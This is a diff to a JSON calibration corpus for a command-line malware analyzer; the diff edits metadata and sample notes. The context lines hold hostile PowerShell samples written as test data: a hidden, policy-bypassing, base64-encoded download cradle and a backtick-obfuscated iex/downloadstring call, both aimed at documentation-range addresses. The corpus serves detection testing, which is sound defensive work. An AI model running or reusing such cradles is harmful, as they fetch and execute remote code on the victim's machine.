@@ -1,7 +1,7 @@
 {
   "_meta": {
     "schema": "{known_bad: [{id, command_line, note, expect_verdict}], known_good: [{id, command_line, note, tolerated_flags}]}",
-    "purpose": "Calibration corpus for core.cmdline_analyzer — plan §6. Measures detection on known-bad and, more importantly, the false-positive rate on known-good.",
+    "purpose": "Calibration corpus for core.cmdline_analyzer. Measures detection on known-bad and, more importantly, the false-positive rate on known-good.",
     "updated": "2026-08-10",
     "sources": [
       "known_bad: public technique patterns documented by MITRE ATT&CK, the LOLBAS project and SigmaHQ rule descriptions. Rewritten by hand — no sample is copied from live malware.",
@@ -10,14 +10,14 @@
     "notes": [
       "Every host and address uses a documentation range (RFC 5737 198.51.100.0/24 / 203.0.113.0/24, RFC 2606 example.com). Nothing here resolves to real infrastructure.",
       "`tolerated_flags` marks a benign line that legitimately matches a keyword — a real administrator does run `schtasks /create` and `-ExecutionPolicy Bypass`. These are documented, reviewed exceptions, NOT a licence to explain away every false positive: anything firing outside its tolerated list fails the calibration gate.",
-      "Milestone A's verdict ceiling is Suspicious (MALICIOUS_REQUIRES_CORROBORATION), so expect_verdict never reads Malicious here. Milestone B should revisit this file, not just extend it."
+      "expect_verdict records what the analyzer currently returns, not an aspiration. A sample only reads Malicious where a second independent source corroborates it."
     ]
   },
   "known_bad": [
     {
       "id": "encoded_dropper",
       "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADcALwBhAC4AcABzADEAJwApAA==",
-      "note": "Classic encoded download cradle with the full evasion switch set. Reached Malicious once Milestone B added Sigma corroboration — obfuscation plus a high-severity rule match, per plan §4 rule 1.",
+      "note": "Classic encoded download cradle with the full evasion switch set. Reaches Malicious because obfuscation is corroborated by a high-severity Sigma rule match.",
       "expect_verdict": "Malicious"
     },
     {
@@ -131,7 +131,7 @@
     {
       "id": "backtick_obfuscated_iex",
       "command_line": "p`o`w`e`r`s`h`e`l`l -c \"i`e`x((n`e`w-object net.webclient).downloadstring('http://198.51.100.20/a'))\"",
-      "note": "Backtick token-splitting evasion. Also reached Malicious under Milestone B.",
+      "note": "Backtick token-splitting evasion. Also reaches Malicious, same reason.",
       "expect_verdict": "Malicious"
     },
     {
